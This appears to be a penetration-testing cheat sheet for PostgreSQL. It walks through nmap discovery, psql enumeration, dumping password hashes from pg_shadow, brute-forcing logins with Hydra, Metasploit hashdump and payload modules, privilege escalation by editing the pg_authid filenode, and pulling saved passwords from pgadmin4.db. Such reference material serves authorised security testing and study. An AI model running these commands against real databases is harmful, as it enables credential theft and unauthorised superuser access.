# 5432,5433 - Pentesting Postgresql

## **Basic Information**

**PostgreSQL** is described as an **object-relational database system** that is **open source**. This system not only utilizes the SQL language but also enhances it with additional features. Its capabilities allow it to handle a wide range of data types and operations, making it a versatile choice for developers and organizations.

**Default port:** 5432, and if this port is already in use it seems that postgresql will use the next port (5433 probably) which is not in use.

```
PORT     STATE SERVICE
5432/tcp open  pgsql
```
## Enumeration
### Identify PostgreSQL
To identify the presence of PostgreSQL, nmap can be quite handy:
```
nmap -sV -p 5432 <target-host>
```
This scans for open PostgreSQL services running on their default port (5432) and attempts to determine the version.

## Version Enumeration
Knowing the version of PostgreSQL can give insights into specific vulnerabilities:
```
nmap -sV --script=postgresql-info -p 5432 <target-host>
```
## Connect & Basic Enum

```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\dt # List tables in the current database:
\du+ # Get users roles

# Extract data from a specific table:
Extract data from a specific table:

# Get current user
SELECT user;

# Get current database
SELECT current_catalog;

# Dumping Hashes
SELECT usename, passwd FROM pg_shadow;
These hashes can be attempted to crack with tools like John The Ripper or hashcat.

# Accessing File System
PostgreSQL can interact with the underlying file system. With enough privileges, an attacker could read or write files, depending on the databaseâ€™s permissions:
COPY (SELECT * FROM sensitive_table) TO '/tmp/sensitive_data.txt';

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```
# Attack Vectors
## Default Credentials
Many PostgreSQL installations use default or weak credentials. Attempt to log in using common defaults like postgres for both username and password.

## Brute Forcing Credentials with Hydra
Before gaining access, it might be necessary to brute force credentials. Tools like Hydra can help in this regard:
```
hydra -L userlist.txt -P passlist.txt <target-ip> postgres
```
## Exploiting Known Vulnerabilities
Check for publicly known vulnerabilities in the specific PostgreSQL version using tools like searchsploit:
```
searchsploit postgresql <version>
```
## Automatic Enumeration

```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```

### Privesc by Overwriting Internal PostgreSQL Tables

The attack steps are:

1. Obtain the PostgreSQL data directory
2. Obtain a relative path to the filenode, associated with the `pg_authid` table
3. Download the filenode through the `lo_*` functions
4. Get the datatype, associated with the `pg_authid` table
5. Use the [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor) to [edit the filenode](https://adeadfed.com/posts/updating-postgresql-data-without-update/#privesc-updating-pg_authid-table); set all `rol*` boolean flags to 1 for full permissions.
6. Re-upload the edited filenode via the `lo_*` functions, and overwrite the original file on the disk
7. _(Optionally)_ Clear the in-memory table cache by running an expensive SQL query
8. You should now have the privileges of a full superadmin.

## **POST**

```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```

### logging

Inside the _**postgresql.conf**_ file you can enable postgresql logs changing:

```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```

Then, **restart the service**.

### pgadmin

[pgadmin](https://www.pgadmin.org) is an administration and development platform for PostgreSQL.\
You can find **passwords** inside the _**pgadmin4.db**_ file\
You can decrypt them using the _**decrypt**_ function inside the script: [https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)

```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```
